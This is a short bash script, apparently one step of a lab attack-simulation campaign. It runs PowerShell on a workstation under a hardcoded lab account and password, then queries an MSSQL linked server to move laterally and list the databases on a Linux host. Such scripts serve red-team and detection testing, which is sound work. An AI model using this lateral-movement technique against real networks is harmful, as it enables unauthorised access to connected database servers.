#!/usr/bin/env bash
# T044 — MSSQL linked-server lateral to linux01 (4-part query) from ws01
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
echo "=== T044 MSSQL → linux01 linked hop ==="
ws01_exec_as analyst_t1 'T13r_An@lyst!' '
$ErrorActionPreference="Stop"
Add-Type -AssemblyName System.Data
$conn = New-Object System.Data.SqlClient.SqlConnection "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT name FROM LINUX01.master.sys.databases"
$r = $cmd.ExecuteReader()
while ($r.Read()) { Write-Output ("DB|" + $r[0]) }
$r.Close(); $conn.Close()
Write-Output "T044_OK"
'
echo "T044 complete"
